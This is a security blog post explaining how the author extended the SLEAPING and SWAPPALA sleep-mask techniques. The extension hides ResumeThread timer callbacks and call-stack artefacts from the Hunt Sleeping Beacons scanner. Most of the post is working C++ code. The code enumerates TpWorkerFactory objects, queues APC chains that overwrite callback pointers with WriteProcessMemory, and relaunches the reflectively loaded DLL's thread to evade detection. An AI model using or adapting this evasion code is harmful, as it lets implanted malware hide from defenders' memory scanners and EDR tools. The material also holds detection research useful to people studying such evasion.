# https://oldboy21.github.io/posts/2024/09/timer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold/

14 minutes

# [Timer Callbacks Spoofing to Improve your SLEAP and SWAPPALA Untold](https://oldboy21.github.io/posts/2024/09/timer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold/)

Hello, Hello, Aloooooooo. After some time away from coding I am here again talking about sleeping masks. Thanks to the great cybersec community there is always something to work on 😄

Last time in my blog I have talked how to hide a memory mapping (where in my case a ReflectiveDLL is loaded) from memory scanners. Particularly, [SLEAPING](https://oldboy21.github.io/posts/2024/06/sleaping-issues-swappala-and-reflective-dll-friends-forever/) and [SWAPPALA](https://oldboy21.github.io/posts/2024/05/swappala-why-change-when-you-can-hide/) techniques are used to swap the malicious mapping with a legit Microsoft DLL at the same address, at sleeping time. That being done via Timers that invoke “ResumeThread” function to wake up suspended worker threads.

All of that was working pretty well, still it was leaving some IOC behind: The great [Hunt Sleeping Beacons](https://github.com/thefLink/Hunt-Sleeping-Beacons) tool by [thefLink](https://twitter.com/thefLinkk) was in fact noticing a thing or two 👀

## Disclaimer

In this blog post I will touch arguments like Worker threads, Timers and Asynchronous Procedures Calls. I will not dive into what those are and specifically how they work, but only how I used them in order to achieve my goals. Said that, if you are not familiar with those concept I would suggest to take a look at that first 🙏🏼

## The Detection

![](https://oldboy21.github.io/timerspoof/image.png)

Starting from the most important detection that inspired this whole work: “A suspicious timer callback was identified pointing to kernel32!ResumeThread”

![animated](https://media0.giphy.com/media/3o6wrebnKWmvx4ZBio/giphy.gif?cid=7941fdc69ek73o90diqbmczn8j0sl8y7teydxpu6z79r2wjb&ep=v1_gifs_search&rid=giphy.gif&ct=g)

Very interesting finding. So the Hunt Sleeping Beacons tool (next referred as HSB) also looks for timer callbacks. For those not too familiar with this concept: a timer callback is the function that is executed once a timer is expired. In SLEAPING many timers are created having ResumeThread as callback in order to trigger the SWAPPALA logic while the main thread is sleeping (definitely better information about this in my previous blogs).

Since what the HSB tool does is keeping a list of those “malicious callbacks” like blacklist approach, the first thought that someone might have is to swap the ResumeThread callback with another one that could achieve the same result and in fact temporary bypass the HSB check.

But that would become a cat&mouse game wouldn’t it?

![animated](https://media1.giphy.com/media/jyTk0vpfS0pyqkgpZu/giphy.gif?cid=7941fdc6r1upnoznfm9jsvi20qblstfnlr5egazkbhkvlqei&ep=v1_gifs_search&rid=giphy.gif&ct=g)

## The Idea

At that point I thought, ok we do a lot of things at sleeping time, why not trying to implement something that hides those callbacks as well? Sneak peeking at the HSB code I have seen how to access to the “TpWorkerFactory” objects that are created once a timer is also created and figured how to potentially modify the callback address. A “TpWorkerFactory” object is created for each timer queue, diving into that object it is possible to reach a double linked list of structures where among the other things also the addresses of the callback are kept. Please refer to HSB code and also [this great resource](https://urien.gitbook.io/diago-lima/a-deep-dive-into-exploiting-windows-thread-pools/attacking-timer-queues) to learn more about the structures mentioned before, it does not really fit here 😄

So the overall idea (at that point in time completely in my mind) was to have some “going to sleep” chain that would look like this:

1. Unmap Reflective DLL Mapping (Timer + ResumeThread)
2. Map Legit DLL (Timer + ResumeThread)
3. Hide Callbacks (Timer + ResumeThread)
4. Sleap (Just time between timers)
5. Fix Callbacks (??????)
6. Unamp Legit DLL (Timer + ResumeThread)
7. Map Reflective DLL Mapping (Timer + ResumeThread)

With a lot of question marks at point 5. Given that at step 3 all the callbacks disappeared (not allowing the timers to be triggered since the “TpWorkerFactory” object was in fact modified with a fake callback), point 5 could not be triggered and as conseguence also the point 6 and 7 making SLEAPING fail miserably. I had to think of a way to execute that point 5 without relying on Timers.

Brainstorming with myself for some time got me to the conclusion I could let [APCs](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls) join the battle

![animated](https://media4.giphy.com/media/elsZ2K3WUFg9bObcSw/giphy.gif?cid=7941fdc6ts7qtkk9pry6viu0ozab18skm787wnxwcryyj7yr&ep=v1_gifs_search&rid=giphy.gif&ct=g)

APCs are “functions that executes asynchronously in the context of a particular thread (each thread has its own APCs queue)”, which is a concept really interesting in the context of Sleeping Masks, in fact already widely used in techniques like [Foliage](https://github.com/realoriginal/foliage) quite some time ago. The main idea of these procedures is that once they are queued to a thread as tasks, as soon as the thread is in “ [alertable](https://learn.microsoft.com/en-us/windows/win32/fileio/alertable-i-o)” state, it would start picking and executing the APCs in a FIFO order. Another small concept I will mention later is “Events”. In Win32 programming in order to synchronize threads, Events can be used. As simply as it sounds, a thread can be hanging on an Event, till the event is in fact signaled (or triggered, whatever wording you like).

Having the opportunities to use these magic routines and objects, I have re-thought of my SLEAPING chain:

01. Enumerate all the TpWorkerFactory objects for the process where the Reflective DLL is injected
02. Creating a queue of APCs for a thread (named ThreadHide) that would hang on an event (EventHide)
03. Creating a queue of APC for a thread (named ThreadFix) that would hang on an event (EventFix)
04. Unmap Reflective DLL Mapping (Timer + ResumeThread)
05. Map Legit DLL (Timer + ResumeThread)
06. Hide Callbacks (Timer + ResumeThread + SetEvent)
07. APCs for ThreadHide executed that would “ [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)” all the TpWorkerFactory object containing a callback to ResumeThread and finally SetEvent(EventFix)
08. APCs for ThreadFix executed that would Sleep first for “SleepingTime” and eventually “ [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)” all the ResumeThread callback back to where they belong
09. Unamp Legit DLL (Timer + ResumeThread)
10. Map the Reflective DLL Mapping (Timer + ResumeThread)

Got tired only thinking about but it should work.

## The Code

Before starting is important to mention that some of the code I used it’s been consulted and/or copied-pasta from the [HSB repository](https://github.com/thefLink/Hunt-Sleeping-Beacons) (for what concerns the TpWorkerFactory enumeration) and from the awesome outstanding code base available in [Maldev Academy](https://maldevacademy.com/) (for what concerns the APCs operations and Foliage explaination) in order to achieve my ideas. But let’s cut to the chase now.

The new version of Sleaping welcomes a new suspended thread (to execute the point 6)

```cpp
[...]

//SLEPING threads contexts
*(ULONG_PTR*)((*context).Rsp) = (DWORD64)ExitThread;
(*context).Rip = (DWORD64)UnmapViewOfFile;
(*context).Rcx = (DWORD64)(ImageBaseDLL);

*(ULONG_PTR*)((*contextB).Rsp) = (DWORD64)ExitThread;
(*contextB).Rip = (DWORD64)MapViewOfFileEx;
(*contextB).Rcx = (DWORD64)sacDllHandle;
(*contextB).Rdx = FILE_MAP_ALL_ACCESS;
(*contextB).R8 = (DWORD64)0x00;
(*contextB).R9 = (DWORD64)0x00;
*(ULONG_PTR*)((*contextB).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
*(ULONG_PTR*)((*contextB).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;

*(ULONG_PTR*)((*contextC).Rsp) = (DWORD64)ExitThread;
(*contextC).Rip = (DWORD64)UnmapViewOfFile;
(*contextC).Rcx = (DWORD64)(ImageBaseDLL);

*(ULONG_PTR*)((*contextD).Rsp) = (DWORD64)ExitThread;
(*contextD).Rip = (DWORD64)MapViewOfFileEx;
(*contextD).Rcx = (DWORD64)malDllHandle;
(*contextD).Rdx = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE;
(*contextD).R8 = (DWORD64)0x00;
(*contextD).R9 = (DWORD64)0x00;
*(ULONG_PTR*)((*contextD).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
*(ULONG_PTR*)((*contextD).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;

//latest arrival for Sleepmasking spoofing
*(ULONG_PTR*)((*contextE).Rsp) = (DWORD64)ExitThread;
(*contextE).Rip = (DWORD64)SetEvent;
(*contextE).Rcx = (DWORD64)(EvntHide);

[...]
```

C++

In total 5 Timers are created within the same TimerQueue:

```cpp
 [...]

 CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[0], 1000, 0, WT_EXECUTEINTIMERTHREAD);//unamp
 CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[1], 1100, 0, WT_EXECUTEINTIMERTHREAD);//mapsac
 CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[4], 2000, 0, WT_EXECUTEINTIMERTHREAD);//hide callbacks
 CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[2], 20000, 0, WT_EXECUTEINTIMERTHREAD);//unmap
 CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[3], 20100, 0, WT_EXECUTEINTIMERTHREAD);//mapma

 [...]
```

C++

Once the Timers are created the ResumeThread callback chase starts (parts of variables declaration is omitted to leave more space and importance to the logic of things):

```cpp
//original unmodified version can be found here
//https://github.com/thefLink/Hunt-Sleeping-Beacons/blob/main/src/EnumerateSuspiciousTimers.cpp
int EnumResumeThreadCallbacks(PVOID ResumeThreadAddress, PTPP_CLEANUP_GROUP_MEMBER* callbackArray) {

[...]

    while ((status = NtQuerySystemInformation(
        SystemHandleInformation,
        buffer,
        bufferSize,
        NULL
    )) == STATUS_INFO_LENGTH_MISMATCH) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        buffer = (PSYSTEM_HANDLE_INFORMATION)VirtualAlloc(NULL, bufferSize *= 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    if (!NT_SUCCESS(status)) {
        return -1;
    }

    PSYSTEM_HANDLE_INFORMATION handleInfo = (PSYSTEM_HANDLE_INFORMATION)buffer;
    POBJECT_TYPE_INFORMATION objectTypeInfo;
    ULONG returnLength;
    objectTypeInfo = (POBJECT_TYPE_INFORMATION)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    for (ULONG_PTR i = 0; i < handleInfo->HandleCount; i++) {

        SYSTEM_HANDLE handle = handleInfo->Handles[i];

        //for each handle i check whether it belongs to my process
        if (handle.ProcessId == GetProcessId(GetCurrentProcess())) {

            if (NtQueryObject((void*)handle.Handle, ObjectTypeInformation, objectTypeInfo, sizeof(OBJECT_TYPE_INFORMATION) * 2, NULL) < 0) {

                continue;
            }
            //if it's a TpWorkerFactory object I enumerate further
            if (!lstrcmpW(objectTypeInfo->Name.Buffer, L"TpWorkerFactory")) {

                //check function below
                GetInfoFromWorkerFactory((HANDLE)handle.Handle, ResumeThreadAddress, &arraySize, callbackArray);

                //Found the right TpWorkerFactory
                //5 is the number of timers I have created
                if (arraySize == 5) {

                    if (buffer) VirtualFree(buffer, 0, MEM_RELEASE);
                    return 0;
                }
                arraySize = 0;
            }
        }
    }
    return -1;
}

//original unmodified version can be found here
//https://github.com/thefLink/Hunt-Sleeping-Beacons/blob/main/src/EnumerateSuspiciousTimers.cpp
VOID* GetInfoFromWorkerFactory(HANDLE hWorkerFactory, PVOID ResumeThreadAddress, int* arraySize, PTPP_CLEANUP_GROUP_MEMBER* callbackArray) {

    [...]

    if (NtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, &wfbi, sizeof(WORKER_FACTORY_BASIC_INFORMATION), NULL) == STATUS_SUCCESS) {

        bSuccess = ReadProcessMemory(GetCurrentProcess(), wfbi.StartParameter, &full_tp_pool, sizeof(FULL_TP_POOL), &len);
        if (bSuccess == FALSE)
            return NULL;

        if (full_tp_pool.TimerQueue.RelativeQueue.WindowStart.Root)
            p_tp_timer = CONTAINING_RECORD(full_tp_pool.TimerQueue.RelativeQueue.WindowStart.Root, FULL_TP_TIMER, WindowStartLinks);
        else if (full_tp_pool.TimerQueue.AbsoluteQueue.WindowStart.Root)
            p_tp_timer = CONTAINING_RECORD(full_tp_pool.TimerQueue.AbsoluteQueue.WindowStart.Root, FULL_TP_TIMER, WindowStartLinks);
        else
            return NULL;

        bSuccess = ReadProcessMemory(GetCurrentProcess(), p_tp_timer, &tp_timer, sizeof(FULL_TP_TIMER), &len);
        if (bSuccess == FALSE)
            return NULL;

        PLIST_ENTRY pHead = tp_timer.WindowStartLinks.Children.Flink;
        PLIST_ENTRY pFwd = tp_timer.WindowStartLinks.Children.Flink;
        LIST_ENTRY entry = { 0 };

        do {

            bSuccess = ReadProcessMemory(GetCurrentProcess(), tp_timer.Work.CleanupGroupMember.Context, ctx, sizeof(TPP_CLEANUP_GROUP_MEMBER), &len);
            if (bSuccess == FALSE)
                break;
            if ((*ctx).FinalizationCallback == ResumeThreadAddress) {
                //I save in my array the pointer to the structure in memory containing the callbacks
                callbackArray[*arraySize] = (PTPP_CLEANUP_GROUP_MEMBER)tp_timer.Work.CleanupGroupMember.Context; //address of the object
                (*arraySize)++;
            }
            p_tp_timer = CONTAINING_RECORD(pFwd, FULL_TP_TIMER, WindowStartLinks);
            bSuccess = ReadProcessMemory(GetCurrentProcess(), p_tp_timer, &tp_timer, sizeof(FULL_TP_TIMER), &len);
            if (bSuccess == FALSE)
                break;

            ReadProcessMemory(GetCurrentProcess(), pFwd, &entry, sizeof(LIST_ENTRY), &len);
            pFwd = entry.Flink;

        } while (pHead != pFwd);
    }
    return NULL;
}
```

C++

Once the TpWorkerFactory objects of interests are enumerated, the SLEAPING APC routine is created and also the threads responsible for the execution of the APCs are added to the list of threads the main thread needs to be waiting for.

```cpp

//TpWorkerFactory objects enumerated successfully so callbackArray now contains the addresses to fix
if (EnumResumeThreadCallbacks(ResumeThreadAddress, callbackArray) == 0) {

    //i should run SleapingAPC here so that all those contexts are available
    if (SleapingAPC(callbackArray, &EvntHide, &EvntFix, ApcThreads, Ctx, CtxInit, CtxFix, CtxInitFix, ResumeThreadValue) == 0) {

        int counter = 5;
        for (int i = 0; i < 2; i++) {

            //adding the newly created APC threads to the thread array to be waiting for
            ThreadArray[counter] = ApcThreads[i];//5
            counter++;

        }
    }
    else {
        return -1;
    }
}

if (WaitForMultipleObjects(7, ThreadArray, TRUE, INFINITE) == WAIT_FAILED) {
    return -1;
}

[...]
//SLEAPING APC FUNCTIONS INVOKED ABOVE
int SleapingAPC(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHANDLE EvntFix, PHANDLE apcThreads, PCONTEXT Ctx, PCONTEXT CtxInit, PCONTEXT CtxFix, PCONTEXT CtxInitFix, PDWORD64 ResumeThreadValue) {

   [...]

    if (NtCreateThreadEx == NULL || NtGetContextThread == NULL || NtWaitForSingleObject == NULL || NtQueueApcThread == NULL || NtAlertResumeThread == NULL) {
        return -1;
    }

    /*-----------HIDING-------------*/

    if (!NT_SUCCESS(Status = NtCreateThreadEx(&Thread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL))) {
        return -1;
    }

    //i copy the context of the thread created
    (*CtxInit).ContextFlags = CONTEXT_FULL;
    if (!NT_SUCCESS(Status = NtGetContextThread(Thread, CtxInit))) {
        return -1;
    }

    for (int i = 0; i < 8; i++) {
        custom_memcpy_classic(&Ctx[i], CtxInit, sizeof(CONTEXT));
    }

    /*---------------------------------*/
    /*-------------FIXING--------------*/

    if (!NT_SUCCESS(Status = NtCreateThreadEx(&ThreadFix, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL))) {
        return -1;
    }

    (*CtxInitFix).ContextFlags = CONTEXT_FULL;
    if (!NT_SUCCESS(Status = NtGetContextThread(ThreadFix, CtxInitFix))) {
        return -1;
    }

    for (int i = 0; i < 8; i++) {
        custom_memcpy_classic(&CtxFix[i], CtxInitFix, sizeof(CONTEXT));
    }

    /*---------------------------------*/
    /*-----------HIDING THREADS-------------*/

    //first thread just waiting for the event to be set
    *(ULONG_PTR*)((Ctx[0]).Rsp) = (DWORD64)NtTestAlertAddress;
    /* wait til EvntSync gets triggered */
    Ctx[0].Rip = (DWORD64)NtWaitForSingleObjectAddress;
    Ctx[0].Rcx = (DWORD64)(*EvntHide);
    Ctx[0].Rdx = FALSE;
    Ctx[0].R8 = NULL;

    *(ULONG_PTR*)((Ctx[1]).Rsp) = (DWORD64)NtTestAlertAddress;
    Ctx[1].Rip = (DWORD64)WriteProcessMemory;
    Ctx[1].Rcx = (DWORD64)(HANDLE)-1;
    Ctx[1].Rdx = (DWORD64) & (callbackinfo[0]->FinalizationCallback);
    Ctx[1].R8 = (DWORD64)SafeCallback;
    Ctx[1].R9 = (DWORD64)sizeof(PVOID);

    *(ULONG_PTR*)((Ctx[2]).Rsp) = (DWORD64)NtTestAlertAddress;
    Ctx[2].Rip = (DWORD64)WriteProcessMemory;
    Ctx[2].Rcx = (DWORD64)(HANDLE)-1;
    Ctx[2].Rdx = (DWORD64) & (callbackinfo[1]->FinalizationCallback);
    Ctx[2].R8 = (DWORD64)SafeCallback;
    Ctx[2].R9 = (DWORD64)sizeof(PVOID);

    *(ULONG_PTR*)((Ctx[3]).Rsp) = (DWORD64)NtTestAlertAddress;
    Ctx[3].Rip = (DWORD64)WriteProcessMemory;
    Ctx[3].Rcx = (DWORD64)(HANDLE)-1;
    Ctx[3].Rdx = (DWORD64) & (callbackinfo[2]->FinalizationCallback);
    Ctx[3].R8 = (DWORD64)SafeCallback;
    Ctx[3].R9 = (DWORD64)sizeof(PVOID);

    *(ULONG_PTR*)((Ctx[4]).Rsp) = (DWORD64)NtTestAlertAddress;
    Ctx[4].Rip = (DWORD64)WriteProcessMemory;
    Ctx[4].Rcx = (DWORD64)(HANDLE)-1;
    Ctx[4].Rdx = (DWORD64) & (callbackinfo[3]->FinalizationCallback);
    Ctx[4].R8 = (DWORD64)SafeCallback;
    Ctx[4].R9 = (DWORD64)sizeof(PVOID);

    *(ULONG_PTR*)((Ctx[5]).Rsp) = (DWORD64)NtTestAlertAddress;
    Ctx[5].Rip = (DWORD64)WriteProcessMemory;
    Ctx[5].Rcx = (DWORD64)(HANDLE)-1;
    Ctx[5].Rdx = (DWORD64) & (callbackinfo[4]->FinalizationCallback);
    Ctx[5].R8 = (DWORD64)SafeCallback;
    Ctx[5].R9 = (DWORD64)sizeof(PVOID);

    //setting the event to trigger ThreadFix
    *(ULONG_PTR*)((Ctx[6]).Rsp) = (DWORD64)NtTestAlertAddress;
    Ctx[6].Rip = (DWORD64)(SetEvent);
    Ctx[6].Rcx = (DWORD64)(*EvntFix);

    Ctx[7].Rip = (DWORD64)(ExitThread);
    Ctx[7].Rcx = (DWORD64)0x00;

    /* queue up apc calls */
    //always the same thread is queued but with a different context
    for (int i = 0; i < 8; i++) {
        if (!NT_SUCCESS(Status = NtQueueApcThread(Thread, (PPS_APC_ROUTINE)NtContinueAddress, &Ctx[i], FALSE, NULL))) {
            return -1;
        }
    }

    if (!NT_SUCCESS(Status = NtAlertResumeThread(Thread, NULL))) {
        return -1;
    }

    /*---------------------------------*/

    /*-----------FIXING THREADS-------------*/

    //first thread just waiting for the event to be set
    *(ULONG_PTR*)((CtxFix[0]).Rsp) = (DWORD64)NtTestAlertAddress;
    /* wait til EvntSync gets triggered */
    CtxFix[0].Rip = (DWORD64)NtWaitForSingleObjectAddress;
    CtxFix[0].Rcx = (DWORD64)(*EvntFix);
    CtxFix[0].Rdx = FALSE;
    CtxFix[0].R8 = NULL;

    //sleep for sleep timer
    *(ULONG_PTR*)((CtxFix[1]).Rsp) = (DWORD64)NtTestAlertAddress;
    CtxFix[1].Rip = (DWORD64)(Sleep);
    CtxFix[1].Rcx = (DWORD64)17000;

    *(ULONG_PTR*)((CtxFix[2]).Rsp) = (DWORD64)NtTestAlertAddress;
    CtxFix[2].Rip = (DWORD64)WriteProcessMemory;
    CtxFix[2].Rcx = (DWORD64)(HANDLE)-1;
    CtxFix[2].Rdx = (DWORD64) & (callbackinfo[0]->FinalizationCallback);
    CtxFix[2].R8 = (DWORD64)ResumeThreadValue;
    CtxFix[2].R9 = (DWORD64)sizeof(PVOID);

    *(ULONG_PTR*)((CtxFix[3]).Rsp) = (DWORD64)NtTestAlertAddress;
    CtxFix[3].Rip = (DWORD64)WriteProcessMemory;
    CtxFix[3].Rcx = (DWORD64)(HANDLE)-1;
    CtxFix[3].Rdx = (DWORD64) & (callbackinfo[1]->FinalizationCallback);
    CtxFix[3].R8 = (DWORD64)ResumeThreadValue;
    CtxFix[3].R9 = (DWORD64)sizeof(PVOID);

    *(ULONG_PTR*)((CtxFix[4]).Rsp) = (DWORD64)NtTestAlertAddress;
    CtxFix[4].Rip = (DWORD64)WriteProcessMemory;
    CtxFix[4].Rcx = (DWORD64)(HANDLE)-1;
    CtxFix[4].Rdx = (DWORD64) & (callbackinfo[2]->FinalizationCallback);
    CtxFix[4].R8 = (DWORD64)ResumeThreadValue;
    CtxFix[4].R9 = (DWORD64)sizeof(PVOID);

    *(ULONG_PTR*)((CtxFix[5]).Rsp) = (DWORD64)NtTestAlertAddress;
    CtxFix[5].Rip = (DWORD64)WriteProcessMemory;
    CtxFix[5].Rcx = (DWORD64)(HANDLE)-1;
    CtxFix[5].Rdx = (DWORD64) & (callbackinfo[3]->FinalizationCallback);
    CtxFix[5].R8 = (DWORD64)ResumeThreadValue;
    CtxFix[5].R9 = (DWORD64)sizeof(PVOID);

    *(ULONG_PTR*)((CtxFix[6]).Rsp) = (DWORD64)NtTestAlertAddress;
    CtxFix[6].Rip = (DWORD64)WriteProcessMemory;
    CtxFix[6].Rcx = (DWORD64)(HANDLE)-1;
    CtxFix[6].Rdx = (DWORD64) & (callbackinfo[4]->FinalizationCallback);
    CtxFix[6].R8 = (DWORD64)ResumeThreadValue;
    CtxFix[6].R9 = (DWORD64)sizeof(PVOID);

    CtxFix[7].Rip = (DWORD64)(ExitThread);
    CtxFix[7].Rcx = (DWORD64)0x00;

    for (int i = 0; i < 8; i++) {
        if (!NT_SUCCESS(Status = NtQueueApcThread(ThreadFix, (PPS_APC_ROUTINE)NtContinueAddress, &CtxFix[i], FALSE, NULL))) {
            return -1;
        }
    }

    if (!NT_SUCCESS(Status = NtAlertResumeThread(ThreadFix, NULL))) {
        return -1;
    }

    /*-----------------------------------------*/

    apcThreads[0] = Thread;
    apcThreads[1] = ThreadFix;
    return 0;
}
```

C++

And that’s about it, just waiting for the bomb to stop ticking 😄

## The Result

Finally the screenshots paragraph:

![](https://oldboy21.github.io/timerspoof/image%201.png)

SLEAPING and SWAPPALA also resisting to some other scanners:

![](https://oldboy21.github.io/timerspoof/image%202.png)![](https://oldboy21.github.io/timerspoof/image%203.png)

## But Wait You Said

Yes, I did mention before that HSB was actually alerting “a thing or two” when it comes to SLEAPING and SWAPPALA.

![](https://oldboy21.github.io/timerspoof/image%204.png)

So besides the suspicious timer alert that at this point of the blog can be ignored, HSB was also detecting some “Abnormal page in callstack: Callstack to blocking function contains NON-executable memory page”. That came across as a surprise to be honest the first time, because since the nature of SWAPPALA is to re-map a legit DLL at the same address of the malcious mapping (and vice versa) the callstack should not contain reference to NON-executable memory page.

After some testing I realized what that was exactly, so the address present in the callstack triggering the HSB checks is a return address pointing to memory that was allocated the first time the DLL was actually written within Notepad.exe, before the Reflective Loading happens basically.

I haven’t tested this too deeply but, despite I was freeing the first allocation after the Reflective DLL was loaded, that memory page was re-used by Notepad.exe process and allocated again as RW page. Being the main thread of the Reflective DLL being ran from the ReflectiveLoader function the callstack was looking pretty much like this:

![](https://oldboy21.github.io/timerspoof/image%205.png)

And HSB was pretty pissed about it. So the way around this that SWAPPALA has found is:

```cpp
//core routine of SWAPPALA and SLEAPING
VOID CoreFunction(LPVOID lpParam) {

    PCORE_ARGUMENTS CoreArguments = NULL;
    CoreArguments = (PCORE_ARGUMENTS)lpParam;

    //looping and Sleaping <3
    do {
        MessageBoxA(NULL, "Sleaping", "Swappala", MB_OK | MB_ICONINFORMATION);
        if (Sleaping(CoreArguments->myBase, CoreArguments->sacDLLHandle, CoreArguments->malDLLHandle, CoreArguments->viewSize) == -1) {
            //nightmares
            MessageBoxA(NULL, "Sleaping", "With Nightmares", MB_OK | MB_ICONINFORMATION);
            return;
        }

    } while (TRUE);

}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {

        PBYTE oldMemory = NULL;

        //even if unampped it's in the PEB
        PBYTE myBase = (PBYTE)GetModuleHandleA("SRH.dll");

        //get handle to NTDLL
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

        //retrieve the information left from the reflective loader
        //retrieve handle of sac dll
        PHANDLE pointerToHandle = (PHANDLE)myBase;
        HANDLE sacDllHandle = *pointerToHandle;

        //retrieve handle of mal dll
        pointerToHandle++;//+8 bytes
        HANDLE malDllHandle = *pointerToHandle;

        //retrieve size of dll in memory
        pointerToHandle++;//+8 bytes
        PSIZE_T pointerToSize = (PSIZE_T)pointerToHandle;
        SIZE_T viewSize = *pointerToSize;

        //retrieve the first buffer address
        pointerToHandle++;//+8 bytes
        oldMemory = (PBYTE) *pointerToHandle;

        //remove the very first buffer allocated for the reflective DLL
        if (VirtualFree(oldMemory, 0, MEM_RELEASE) == 0) {
            //error releasing old buffer
            return FALSE;
        }
        //adding NtContinue to valid target as the new SleapingAPC implementation
        CfgAddressAdd(GetCurrentProcess(),hNtdll, GetProcAddress(hNtdll, "NtContinue"));

        PCORE_ARGUMENTS CoreArguments = (PCORE_ARGUMENTS)VirtualAlloc(NULL, sizeof(CORE_ARGUMENTS), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        CoreArguments->myBase = myBase;
        CoreArguments->sacDLLHandle = sacDllHandle;
        CoreArguments->malDLLHandle = malDllHandle;
        CoreArguments->viewSize = viewSize;
        //creating a new thread in the address space of SRH.dll
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CoreFunction, CoreArguments, 0, NULL);

        if (hThread != NULL) {
            //killing the thread coming from the Reflective Loader
            ExitThread(0);
        }


    }
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

C++

As mentioned in the comment, I have fixed that by creating a new thread in the address space of SRH.dll (my sacrificial DLL) and exiting the thread coming from the Reflective Loader context, in fact cleaning the stack and get rid of that IOC as well.

It’s important to mention that other sleeping masks achieve this spoofing the stack of the main thread at sleep time, however that it’s not necessary in the case of SWAPPALA.

## Conclusions and Credits

It was fun as always, maybe bit overengineered but efficient, I will keep working on this to find a way to improve. I will also take some time before merging this branch but feel free to reach out in case you have questions or doubts.

I have mentioned this quite extensively already, but big shout out and thanks to authors of code from:

- [https://github.com/thefLink/Hunt-Sleeping-Beacons](https://github.com/thefLink/Hunt-Sleeping-Beacons)
- [https://maldevacademy.com/](https://maldevacademy.com/)
- [https://urien.gitbook.io/diago-lima/a-deep-dive-into-exploiting-windows-thread-pools/attacking-timer-queues](https://urien.gitbook.io/diago-lima/a-deep-dive-into-exploiting-windows-thread-pools/attacking-timer-queues)

* * *

[untagged](https://oldboy21.github.io/tags/untagged/)

2832 Words

2024-09-17 14:50

* * *

[Share on facebook](https://facebook.com/sharer/sharer.php?u=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f "Share on facebook")[Share on twitter](https://twitter.com/intent/tweet/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f "Share on twitter")[Share on tumblr](https://www.tumblr.com/widgets/share/tool?posttype=link&title=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold&caption=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold&canonicalUrl=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f "Share on tumblr")[Share via email](mailto:?subject=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold&body=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f "Share via email")[Share on pinterest](https://pinterest.com/pin/create/button/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f&media=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f;description=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold "Share on pinterest")[Share on linkedin](https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f&title=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold&summary=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold&source=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f "Share on linkedin")[Share on reddit](https://reddit.com/submit/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f&resubmit=true&title=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold "Share on reddit")[Share on 